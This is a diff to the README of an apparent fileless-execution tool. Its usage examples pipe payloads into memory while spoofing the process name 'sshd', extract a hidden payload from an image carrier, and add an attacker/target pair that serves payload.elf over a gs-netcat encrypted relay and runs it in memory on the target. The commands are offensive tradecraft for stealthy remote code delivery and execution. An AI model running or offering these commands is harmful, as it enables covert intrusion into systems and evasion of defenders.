@@ -43,8 +43,11 @@ cat payload.enc | KEY=<64-hex-chars> gomexec
 # extract a hidden payload from a carrier file, pipe straight into memory
 nightcloak reveal carrier.jpg -p pass | NAME=sshd gomexec
 
-# chain with gsocket
-cat payload.elf | NAME=sshd gomexec -s gs_secret
+# chain with gsocket (https://gsocket.io/deploy)
+# gsocket tunnels data over an encrypted relay, no VPS needed
+# attacker: cat payload.elf | gs-netcat -s SECRET -l
+# target: receive over encrypted tunnel, execute straight into memory
+gs-netcat -s SECRET | NAME=sshd gomexec
 ```
 
 ## Environment Variables
